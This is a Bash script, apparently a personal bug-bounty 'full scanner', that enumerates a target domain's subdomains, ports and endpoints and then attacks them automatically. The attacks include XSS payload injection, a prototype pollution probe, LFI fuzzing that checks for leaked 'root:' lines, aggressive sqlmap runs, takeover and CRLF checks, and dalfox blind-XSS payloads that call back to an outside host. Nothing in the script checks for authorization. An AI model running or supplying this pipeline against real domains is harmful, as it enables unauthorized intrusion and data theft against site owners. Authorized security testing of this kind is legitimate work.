#!/bin/bash

# Definindo cores
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sem cor

# Banner
banner(){
cat << "EOF"                
               ███╗   ███╗██████╗ ██╗  ██╗
               ████╗ ████║██╔══██╗╚██╗██╔╝
               ██╔████╔██║██████╔╝ ╚███╔╝
               ██║╚██╔╝██║██╔══██╗ ██╔██╗
               ██║ ╚═╝ ██║██║  ██║██╔╝ ██╗
               ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                    :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
%"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
EOF
echo -e "${BLUE}+ -- --=[Scanner by MRX${NC}"
echo -e "${YELLOW}+ -- --= Scanner FULL :)${NC}"
}

# Executando o banner
banner

# Verificando a entrada do domínio
read -p "Enter the domain: " domain

# Verificando se o domínio foi fornecido
if [ -z "$domain" ]; then
    echo -e "${RED}Error: Domain not provided.${NC}"
    exit 1
fi

# Criando pasta para o domínio
folder="$domain"
mkdir -p "$folder"

# Executando subfinder para encontrar subdomínios
echo -e "\e[33mRunning subfinder\e[0m"
subfinder -d "$domain" -all -o "$folder/subfinder_tmp.txt"

# Executando amass para encontrar subdomínios
echo -e "\e[33mRunning amass\e[0m"
amass enum -passive -norecursive -d "$domain" -o "$folder/amass_tmp.txt"

# Executando Findomain
echo -e "\e[33mRunning Findomain\e[0m"
findomain -t "$domain" -q 2>/dev/null > "$folder/Findomain_tmp.txt"

# Executando Assetfinder
echo -e "\e[33mRunning Assetfinder\e[0m"
assetfinder --subs-only "$domain" > "$folder/Assetfinder_tmp.txt"

# Executando chaos
echo -e "\e[33mRunning Chaos\e[0m"
chaos -d "$domain" -o "$folder/chaos_tmp.txt"

#gau-subdomains
echo -e "\e[33mRunning Gau subdomains\e[0m"
gau --threads 10 --subs "$domain" | unfurl -u domains > "$folder/gau_tmp.txt"

#github-subdomains verificar Api
echo -e "\e[33mRunning Github subdomains\e[0m"
github-subdomains -d "$domain" -o "$folder/github_tmp.txt"

#gitlab-subdomains verificar Api
echo -e "\e[33mRunning Gitlab subdomains\e[0m"
gitlab-subdomains -d "$domain" > "$folder/gitlab_tmp.txt"

#cero-subdomains
echo -e "\e[33mRunning Cero subdomains\e[0m"
cero "$domain" > "$folder/cero_temp.txt"

#center-subdomains
echo -e "\e[33mRunning Center subdomains\e[0m"
curl "https://api.subdomain.center/?domain=$domain" -s | jq -r '.[]' | sort -u > "$folder/center_tmp.txt"

# Executando Sublist3r
# colocar caminho Sublist3r
echo -e "\e[33mRunning Sublist3r\e[0m"
python3 ~/Sublist3r/sublist3r.py -d "$domain" -v -o "$folder/Sublist3r_tmp.txt"

# Executando jldc
echo -e "\e[33mRunning jldc\e[0m"
curl -s "https://jldc.me/anubis/subdomains/$domain" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep "$domain" | grep -v "*" | sed -e 's/^[[:punct:]]//g' | sed -r '/^\s*$/d' | sort -u > "$folder/jldc_tmp.txt"

# Executando wayback
echo -e "\e[33mRunning wayback\e[0m"
curl -sk "http://web.archive.org/cdx/search/cdx?url=*.$domain&output=txt&fl=original&collapse=urlkey&page=" | awk -F/ '{gsub(/:.*/, "", $3); print $3}' | sort -u > "$folder/wayback_tmp.txt"

# Executando crt
echo -e "\e[33mRunning crt\e[0m"
curl -sk "https://crt.sh/?q=%.$domain&output=json" | tr ',' '\n' | awk -F'"' '/name_value/ {gsub(/\*\./, "", $4); gsub(/\\n/,"\n",$4);print $4}' | sort -u > "$folder/crt_tmp.txt"

# Executando abuseipdb
echo -e "\e[33mRunning abuseipdb\e[0m"
curl -s "https://www.abuseipdb.com/whois/$domain" -H "user-agent: firefox" -b "abuseipdb_session=" | grep -E '<li>\w.*</li>' | sed -E 's/<\/?li>//g' | sed -e "s/$/.$domain/" | sort -u > "$folder/abuseipdb_tmp.txt"

# Executando alienvault
echo -e "\e[33mRunning alienvault\e[0m"
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" | jq '.passive_dns[].hostname' 2>/dev/null | grep -o "\w.*$domain" | sort -u > "$folder/alienvault_tmp.txt"

# Executando urlscan.io
echo -e "\e[33mRunning urlscan\e[0m"
curl -s "https://urlscan.io/api/v1/search/?q=domain:$domain" | jq '.results[].page.domain' 2>/dev/null | grep -o "\w.*$domain"| sort -u > "$folder/urlscan_tmp.txt"

# Executando RapidDNS
echo -e "\e[33mRunning RapidDNS\e[0m"
curl -s "https://rapiddns.io/subdomain/$domain?full=1#result" | grep -v "RapidDNS" | grep -v "<td><a" | cut -d '>' -f 2 | cut -d '<' -f 1 | grep "$domain" | grep -v "*" | sed -e 's/^[[:punct:]]//g' | sed -r '/^\s*$/d' | sort -u > "$folder/RapidDNS_tmp.txt"

# Limpando e ordenando subdomínios
echo -e "\e[33mCleaning and sorting subdomains\e[0m"
cat "$folder/subfinder_tmp.txt" "$folder/amass_tmp.txt" "$folder/Findomain_tmp.txt" "$folder/Assetfinder_tmp.txt" "$folder/Sublist3r_tmp.txt" "$folder/jldc_tmp.txt" "$folder/wayback_tmp.txt" "$folder/crt_tmp.txt" "$folder/abuseipdb_tmp.txt" "$folder/alienvault_tmp.txt" "$folder/urlscan_tmp.txt" "$folder/RapidDNS_tmp.txt" "$folder/chaos_tmp.txt" "$folder/gau_tmp.txt" "$folder/github_tmp.txt" "$folder/gitlab_tmp.txt" "$folder/cero_temp.txt" "$folder/center_tmp.txt" > "$folder/subdomains_tmp1.txt"
sort -u "$folder/subdomains_tmp1.txt" > "$folder/subdomains.txt"
rm "$folder/subfinder_tmp.txt" "$folder/amass_tmp.txt" "$folder/Findomain_tmp.txt" "$folder/Assetfinder_tmp.txt" "$folder/Sublist3r_tmp.txt" "$folder/jldc_tmp.txt" "$folder/wayback_tmp.txt" "$folder/crt_tmp.txt" "$folder/abuseipdb_tmp.txt" "$folder/alienvault_tmp.txt" "$folder/urlscan_tmp.txt" "$folder/RapidDNS_tmp.txt" "$folder/chaos_tmp.txt" "$folder/gau_tmp.txt" "$folder/github_tmp.txt" "$folder/gitlab_tmp.txt" "$folder/cero_temp.txt" "$folder/center_tmp.txt"
rm "$folder/subdomains_tmp1.txt"

# Executando Naabu Portas Scan
echo -e "\e[33mRunning naabu...\e[0m"
naabu -c 250 -l "$folder/subdomains.txt" -port "81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,3000,5000,8080,8000,8081,8888,8069,8009,8001,8070,8088,8002,8060,8091,8086,8010,8050,8085,8089,8040,8020,8051,8087,8071,8011,8030,8061,8072,8100,8083,8073,8099,8092,8074,8043,8035,8055,8021,8093,8022,8075,8044,8062,8023,8094,8012,8033,8063,8045,7000,9000,7070,9001,7001,10000,9002,7002,9003,7003,10001,80,443,4443" | anew "$folder/portscan.txt"
echo -e "\e[33mRunning httpx Live ports\e[0m"
httpx -l "$folder/portscan.txt" -o "$folder/liveports.txt"
rm "$folder/portscan.txt"

# Executando httpx para encontrar subdomínios ativos
echo -e "\e[33mFinding live subdomains...\e[0m"
httpx -l "$folder/subdomains.txt" -o "$folder/live_subdomains.txt"

# filter subdomains by keywords
echo -e "\e[33mfilter subdomains by keywords...\e[0m"
cat "$folder/live_subdomains.txt" | egrep -i "internal|api|test|prod|private|secret|git|login|admin|staging|dev|jira|intranet|vip|portal|register|pass|reset|client|database|server|backup|Credential|database|docker|encryption|security|authorization|authentication|monitoring|logging|certificate|token|integration|endpoint|validation|configuration|deployment" > "$folder/active_priority.txt"

# Extract .js Subdomains
echo -e "\e[33mExtract .js Subdomains...\e[0m"
cat "$folder/live_subdomains.txt" | getJS --complete | anew "$folder/JS.txt"

# Executando gau para encontrar endpoints
echo -e "\e[33mFinding endpoints with gau...\e[0m"
cat "$folder/live_subdomains.txt" | gau --blacklist png,jpg,gif,svg,jpeg,pdf --threads 6 --o "$folder/EndpointsGau.txt"

# Executando waybackurls
echo -e "\e[33mExecutando waybackurls...\e[0m"
cat "$folder/live_subdomains.txt" | waybackurls > "$folder/EndpointsWay.txt"

# Executando gospider
echo -e "\e[33mExecutando gospider...\e[0m"
gospider -S "$folder/live_subdomains.txt" -o "$folder/output" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source 
cat "$folder/output/*" | grep -e "code-200" | awk '{print $5}' | anew "$folder/EndpointsGos.txt"
rm -r "$folder/output"

# Executando hakrawler
echo -e "\e[33mExecutando hakrawler...\e[0m"
cat "$folder/live_subdomains.txt" | hakrawler -subs -u -t 10 | anew "$folder/EndpointsHakrawler.txt"

# Executando katana 
echo -e "\e[33mFinding endpoints with katana...\e[0m"
cat "$folder/live_subdomains.txt" | katana -silent -jc -kf all -d 3 -fs rdn -c 30 -o "$folder/Endpointskat.txt"

# Removendo duplicatas usando uro
echo -e "\e[33mRemoving duplicats Endpoints...\e[0m"
cat "$folder/EndpointsGau.txt" "$folder/EndpointsWay.txt" "$folder/EndpointsGos.txt" "$folder/Endpointskat.txt" "$folder/EndpointsHakrawler.txt" > "$folder/Endpoints1.txt"
cat "$folder/Endpoints1.txt" | uro | anew "$folder/EndpointsL.txt"
rm "$folder/EndpointsGau.txt" "$folder/EndpointsWay.txt" "$folder/EndpointsGos.txt" "$folder/Endpointskat.txt" "$folder/EndpointsHakrawler.txt"
rm "$folder/Endpoints1.txt"

# Executando Gf Patterns
echo -e "\e[32mExecutando Gf lfi...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q Lfi.txt

echo -e "\e[32mExecutando Gf sqli...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q sqli.txt

echo -e "\e[32mExecutando Gf xss...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf xss | anew -q "$folder/xss.txt"

# Usando Gxss para enviar payloads para endpoints XSS potenciais
echo -e "\e[32mSending payloads with Gxss...\e[0m"
cat "$folder/xss.txt" | Gxss -p khXSS -o "$folder/XSS_Ref.txt"

echo -e "\e[32mExecutando Gf redirect...\e[0m"
cat "$folder/EndpointsL.txt" | gf redirect | anew -q "$folder/redirect.txt"

echo -e "\e[32mExecutando Gf rce...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf rce | anew "$folder/rce.txt"

echo -e "\e[32mExecutando Gf debug_logic...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf debug_logic | anew "$folder/debug_logic.txt"

echo -e "\e[32mExecutando Gf idor...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf idor | anew "$folder/idor.txt"

echo -e "\e[32mExecutando Gf interestingEXT...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf interestingEXT | anew "$folder/interestingEXT.txt"

echo -e "\e[32mExecutando Gf interestingparams...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf interestingparams | anew "$folder/interestingparams.txt"

echo -e "\e[32mExecutando Gf interestingsubs...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf interestingsubs | anew "$folder/interestingsubs.txt"

echo -e "\e[32mExecutando Gf ssti...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf ssti | anew "$folder/ssti.txt"

echo -e "\e[32mExecutando Gf ssrf...\e[0m"
cat "$folder/EndpointsL.txt" | uro | gf ssrf | anew "$folder/ssrf.txt"

echo -e "\e[32mExecutando Testes de Vulnerabilidade\e[0m"

# teste xss
echo -e "\e[32mExecutando qsreplace xss...\e[0m"
"$folder/xss.txt" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' > "$folder/qsreplaceVul.txt"

# Prototype Pollution One-line
echo -e "\e[32mPrototype Pollution One-line\e[0m"
httpx -l "$folder/subdomains.txt" -threads 200 | anew -q FILE.txt && sed 's/$/\/?_proto_[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOTVULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" > "$folder/PrototypeP.txt"      
rm FILE.txt

#lfi
# Passar caminho da Wordlist de paylouds!!!
# https://raw.githubusercontent.com/mrxbug/lfi-paylouds-small/main/lfi.txt
echo -e "\e[32mExecutando lfi Vulnerabilit\e[0m"
cat ~/wordlists/payloads/lfi.txt | xargs -P 50 -I % bash -c "cat Lfi.txt | qsreplace % " 2> /dev/null | anew -q templfi.txt
xargs -a templfi.txt -P 50 -I % bash -c "curl -s -L  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"root:\" && echo -e \"[POTENCIAL LFI] - % \n \"" 2> /dev/null | grep "POTENCIAL LFI" | anew -q "$folder/vulnerabilitieslfi.txt"
mv Lfi.txt "$folder/lfi.txt"
rm templfi.txt

#Sqli vulnerabilities
# Passar caminho do sqlmap
echo -e "\e[32mExecutando sqli Vulnerabilit\e[0m"
cat sqli.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir="$folder/sqlmapVUL.txt" 2> /dev/null" &> /dev/null
mv sqli.txt "$folder/sqli.txt"

# takeover vulnerabilities
# criar caminho e add o arquivo abaixo
#https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json
echo -e "\e[32mExecutando takeover Vulnerabilit\e[0m"
subjack -w "$folder/subdomains.txt" -t 20 -a -o "$folder/takeover.txt" -ssl

# openredirect
# passar caminho template open-redirect
echo -e "\e[32mExecutando open-redirect Vulnerabilit\e[0m"
cat "$folder/redirect.txt" | nuclei -t ~/nuclei-templates/http/vulnerabilities/generic/open-redirect.yaml -o "$folder/open-redirectVUL.txt" 

# crlfuzz 
echo -e "\e[32mExecutando crlfuzz Vulnerabilit\e[0m"
crlfuzz -l "$folder/live_subdomains.txt" -c 50 -s -o "$folder/crlfVul.txt"

# dalfox
echo -e "\e[32mExecutando dalfox Vulnerabilit\e[0m"
dalfox file "$folder/XSS_Ref.txt" --skip-mining-all -b 'https://mrxbugcom.bxss.in' -o "$folder/Vulnerable_XSS.txt"

# nuclei exposures JS
echo -e "\e[32mExecutando nuclei JS Vulnerabilit\e[0m"
nuclei -l "$folder/JS.txt" -t ~/nuclei-templates/http/exposures/ -o "$folder/js_Vul.txt"

# nuclei
echo -e "\e[32mExecutando nuclei Vulnerabilit\e[0m"
nuclei -l "$folder/live_subdomains.txt" -severity low,medium,high,critical -o "$folder/severityNUclei.txt" -H "User-Agent:Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0"

# Arquivos rápidos e suculentos com lista de palavras tomnomnom e ffuf
echo -e "\e[33mffuf Arquivos suculentos...\e[0m"
ffuf -w ~/wordlists/common-paths-tom.txt -u "https://$domain/FUZZ" -o "$folder/ffuf.txt"

echo -e "\e[34mScanner Concluído\e[0m"





